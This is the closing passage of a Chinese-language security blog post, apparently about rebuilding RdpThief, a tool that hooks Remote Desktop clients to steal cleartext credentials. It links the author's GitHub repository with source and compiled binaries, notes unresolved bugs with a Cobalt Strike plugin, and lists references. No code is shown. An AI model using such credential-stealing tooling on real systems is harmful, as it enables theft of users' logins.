![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0eb076bf2d20f2c723976af5ee23fc9cce8aa72b.png)

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f439c0932215bbb19c89ff4f8b29aa5d0a9748c8.png)

结果如下：

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-05284d0b658e0fbcb5a0563b4005750bb09808f1.png)

0x09 福利时间
---------

老样子，所用到的代码，和编译后的，都丢到了 Github：<https://github.com/fengwenhua/RdpThief> ，自取。

0x0a 后言
-------

本文有两个小尾巴其实没有完全解决，不过，先留着吧，以后随着技术提高，我相信我会搞明白的。

1. API Monitor 和 WinDbg 和 VS 里面，函数名不一样，这到底为啥？？
2. cs 插件加载后，获取到的数据，有时候会乱码，这又是为啥？？

0x0b 参考链接
---------

<https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/>

<https://www.ired.team/offensive-security/code-injection-process-injection/api-monitoring-and-hooking-for-offensive-tooling>

<https://github.com/0x09AL/RdpThief>

**都看到这里了，不管你是直接拉到底的，还是看到底的，要不辛苦一下，给点个推荐呗？**